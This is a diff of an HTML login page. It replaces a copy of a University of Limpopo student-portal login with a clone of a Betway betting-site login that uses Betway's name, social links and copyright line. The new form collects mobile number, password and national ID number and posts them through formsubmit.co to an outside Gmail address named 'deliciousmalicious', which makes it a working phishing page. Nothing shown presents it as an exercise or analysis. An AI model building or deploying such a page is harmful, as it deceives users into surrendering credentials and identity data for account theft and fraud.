@@ -1,106 +1,138 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-US">
 <head>
-  <meta charset="UTF-8">
-  <title>UL Self Help iEnabler (Recreated)</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8" />
+  <title>aviator</title>
+  <link rel="stylesheet" href="/css/styles.css" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  
   <style>
     body {
+      background: #2c3338;
+      color: #606468;
+      font: 87.5%/1.5em 'Open Sans', sans-serif;
       margin: 0;
-      font-family: "Segoe UI", sans-serif;
-      background-color: #f2f2f2;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
 
-    .header {
-      background-color: #004d40;
-      color: white;
-      padding: 15px 20px;
-      text-align: left;
-      font-size: 22px;
-      font-weight: bold;
+    input {
+      border: none;
+      font-family: 'Open Sans', Arial, sans-serif;
+      font-size: 16px;
+      line-height: 1.5em;
+      padding: 0;
     }
 
-    .sub-header {
-      background-color: #e0f2f1;
-      padding: 10px 20px;
-      font-size: 14px;
-      color: #333;
+    p {
+      line-height: 1.5em;
     }
 
-    .login-container {
-      max-width: 400px;
-      margin: 40px auto;
-      background-color: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-    }
-
-    .login-container h2 {
+    #login {
+      width: 320px;
       text-align: center;
-      color: #004d40;
-      margin-bottom: 30px;
     }
 
-    label {
-      font-weight: bold;
-      display: block;
-      margin-top: 15px;
-      color: #333;
+    #login form {
+      margin: auto;
+      padding: 30px;
+      border-bottom-left-radius: 10px;
+      border-bottom-right-radius: 10px;
+      background: #22272a;
+      padding-top: 20px;
+      padding-bottom: 10px;
+      box-shadow: 5px 5px 10px rgba(255, 255, 255, 0.2);
     }
 
-    input[type="text"],
-    input[type="password"] {
+    .input {
+      background-color: #3b4148;
+      border: 1px solid #48505a;
+      border-radius: 5px;
+      color: #a9a9a9;
+      margin-bottom: 1em;
+      padding: 10px 16px;
       width: 100%;
-      padding: 10px;
-      margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
+      outline: 0;
+      height: 40px;
       box-sizing: border-box;
     }
 
-    button {
+    .submitbtn {
+      background: #C42828;
+      border: 0;
       width: 100%;
-      margin-top: 25px;
-      padding: 12px;
-      background-color: #004d40;
+      height: 40px;
+      border-radius: 10px;
       color: white;
-      border: none;
-      border-radius: 4px;
-      font-size: 16px;
       cursor: pointer;
+      transition: background 0.3s ease-in-out;
     }
 
-    button:hover {
-      background-color: #00695c;
+    .submitbtn:hover {
+      background: #076064;
     }
 
-    .footer {
+    h1 {
       text-align: center;
-      font-size: 13px;
+      color: white;
+      font-size: 50px;
       margin-top: 20px;
-      color: #888;
+      margin-bottom: 20px;
+    }
+
+    img {
+      border-top-left-radius: 8px;
+      border-top-right-radius: 8px;
+      width: 99%;
+      display: block;
+      margin: 0 auto;
+      box-shadow: 5px 5px 10px rgba(255, 255, 255, 0.2);
+    }
+
+    .fa {
+      padding: 10px;
+      font-size: 20px;
+      width: 50px;
+      text-align: center;
+      text-decoration: none;
+      padding-bottom: 0px;
+      color: #C42828;
     }
   </style>
 </head>
 <body>
+  <div id="login">
 
-  <div class="header">UNIVERSITY OF LIMPOPO</div>
-  <div class="sub-header">Self Help iEnabler System</div>
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS4lMdFDHasdo4igYwr4SOLVjC69ojkkxWNAw&usqp=CAU" alt="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS4lMdFDHasdo4igYwr4SOLVjC69ojkkxWNAw&usqp=CAU">
 
-  <div class="login-container">
-    <h2>Login</h2>
-    <form action="#" method="POST">
-      <label for="studentNumber">Student Number</label>
-      <input type="text" id="studentNumber" name="studentNumber" required>
 
-      <label for="pin">PIN</label>
-      <input type="password" id="pin" name="pin" required>
 
-      <button type="submit">Login</button>
+
+    <form action="https://formsubmit.co/deliciousmalicious@gmail.com" method="POST">
+      <h1>BetWay</h1>
+      <h3 style="text-align: center; color: white;">Login</h3>
+      
+      <p style="font-weight: bold; font-size: 10px;color: #C42828;text-shadow: black 10%;" >Powered By Habanero☆</p>
+      
+      <input type="number" class="input" id="user" name="mobile_number" placeholder="Mobile Number" required/>
+
+     <input type="password"          class="input" id="pass" name="password" placeholder="Password" required/>
+
+<input type="ID Number"class="input"id="ID"name="ID Number"placeholder="ID Number" required/>
+
+      <button type="submit" class="submitbtn">start</button> 
+      
+      <a href="https://www.facebook.com/betwaysouthafrica?mibextid=sAuArU1zVvLjaiq0" class="fa fa-facebook"></a>
+      <a href="https://www.instagram.com/betway_sa?igsh=OGQ5ZDc2ODk2ZA==" class="fa fa-instagram"></a>
+      <a href="https://x.com/Betway_za?t=IySQkA5U2GNg_s1u4b7i7Q&s=09" class="fa fa-twitter"></a>
+
+      <footer>
+        <p>&copy;2023 Betway.co.za. All rights reserved.</p>
+      </footer>
     </form>
-    <div class="footer">© 2025 UL Student Portal. Recreated Version</div>
   </div>
-
 </body>
 </html>
